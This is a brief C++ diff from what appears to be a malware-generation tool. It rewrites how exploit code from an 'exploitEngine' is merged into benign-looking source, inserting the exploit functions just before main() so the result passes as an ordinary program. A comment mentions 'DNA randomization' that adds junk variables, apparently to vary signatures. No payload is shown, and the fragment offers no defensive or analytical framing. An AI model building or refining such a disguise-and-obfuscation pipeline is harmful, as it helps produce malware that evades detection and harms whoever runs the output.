@@ -1544,10 +1544,24 @@ public:
                 exploitIncludes = exploitEngine.getExploitIncludes(exploitType);
             }
             
-            // Combine benign code with exploit code
-            std::string combinedCode = exploitIncludes + "\n" + benignCode;
+            // Combine benign code with exploit code properly
+            std::string combinedCode = exploitIncludes + "\n";
+            
             if (!exploitCode.empty()) {
-                combinedCode += "\n" + exploitCode + "\n";
+                // Extract the main function from benign code and insert exploit functions before it
+                size_t mainPos = benignCode.find("int main()");
+                if (mainPos != std::string::npos) {
+                    // Insert includes and exploit functions before main
+                    combinedCode += benignCode.substr(0, mainPos);
+                    combinedCode += "\n" + exploitCode + "\n\n";
+                    combinedCode += benignCode.substr(mainPos);
+                } else {
+                    // Fallback: just append (this shouldn't happen with our benign code)
+                    combinedCode += benignCode + "\n" + exploitCode;
+                }
+            } else {
+                // No exploits, just use benign code
+                combinedCode += benignCode;
             }
             
             // Apply DNA randomization (this adds junk variables safely)
